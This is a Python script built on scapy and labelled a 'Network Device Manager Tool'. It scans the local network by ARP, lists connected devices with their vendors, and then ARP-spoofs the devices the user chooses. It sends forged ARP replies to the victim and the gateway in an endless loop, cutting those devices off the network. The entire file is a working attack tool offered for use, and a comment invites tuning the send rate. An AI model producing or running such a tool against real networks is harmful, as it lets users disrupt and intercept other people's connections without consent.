#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
from mac_vendor_lookup import MacLookup
import time

# Interface settings - will be detected automatically
INTERFACE = None

def get_active_interface():
    """Detect the active network interface with readable names"""
    active_ifaces = []
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip != "127.0.0.1":  # Ignore localhost
                try:
                    iface_name = conf.ifaces.dev_from_name(iface).description
                except:
                    iface_name = iface  # Fallback if description not available
                active_ifaces.append((iface, iface_name, ip))
        except OSError:
            continue

    if not active_ifaces:
        return None

    if len(active_ifaces) == 1:
        return active_ifaces[0][0]

    print("\nAvailable interfaces:")
    for i, (iface, name, ip) in enumerate(active_ifaces):
        print(f"{i}. {name} ({ip})")
    choice = input("Select interface number: ").strip()
    try:
        return active_ifaces[int(choice)][0]
    except:
        return None

def scan_network():
    """Scan the network and return a list of devices"""
    global INTERFACE
    INTERFACE = get_active_interface()
    if not INTERFACE:
        print("No active network interface found!")
        return []
    
    print(f"\nScanning using interface: {INTERFACE}")
    
    # Get gateway IP and IP range
    gateway_ip = conf.route.route("0.0.0.0")[2]
    ip_range = f"{gateway_ip}/24"
    
    # Send ARP requests
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range),
                timeout=2, iface=INTERFACE, verbose=False)
    
    my_mac = get_if_hwaddr(INTERFACE)
    devices = []
    
    for _, rcv in ans:
        if rcv.hwsrc != my_mac:  # Ignore my own device
            devices.append((rcv.psrc, rcv.hwsrc))
    
    return devices

def block_device(target_mac, target_ip):
    """Block a device using continuous ARP Spoofing until stopped"""
    gateway_ip = conf.route.route("0.0.0.0")[2]
    gateway_mac = getmacbyip(gateway_ip)

    if not gateway_mac:
        print("Could not get gateway MAC address!")
        return

    pkt_to_victim = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        psrc=gateway_ip,
        hwdst=target_mac
    )

    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip,
        psrc=target_ip,
        hwdst=gateway_mac
    )

    print(f"[+] Blocking {target_ip} ({target_mac})... Press CTRL+C to stop.")
    try:
        while True:
            sendp(pkt_to_victim, iface=INTERFACE, verbose=False)
            sendp(pkt_to_gateway, iface=INTERFACE, verbose=False)
            time.sleep(0.2)  # سرعة الإرسال (ممكن تزودها أو تقللها)
    except KeyboardInterrupt:
        print(f"\n[!] Stopped blocking {target_ip}")

def main():
    print("Network Device Manager Tool")
    print("="*40)
    
    while True:
        devices = scan_network()
        
        if not devices:
            print("No other devices found!")
            time.sleep(5)
            continue
        
        print("\nConnected devices:")
        print("-"*40)
        for i, (ip, mac) in enumerate(devices):
            try:
                vendor = MacLookup().lookup(mac)
            except:
                vendor = "Unknown Vendor"
            print(f"{i}. {ip} - {mac} ({vendor})")
        
        print("\nEnter the numbers of devices you want to block (e.g., 0 2 3)")
        print("Or type 'scan' to rescan, 'exit' to quit")
        choice = input("Your choice: ").strip().lower()
        
        if choice == 'exit':
            break
            
        if choice == 'scan':
            continue
            
        try:
            selected = [int(x) for x in choice.split()]
            for device_num in selected:
                if 0 <= device_num < len(devices):
                    ip, mac = devices[device_num]
                    print(f"Blocking {ip}...")
                    for _ in range(3):  # Send 3 packets for effect
                        block_device(mac, ip)
                        time.sleep(0.1)
                else:
                    print(f"Invalid number: {device_num}")
        except ValueError:
            print("Invalid input! Use numbers only.")

if __name__ == "__main__":
    main()
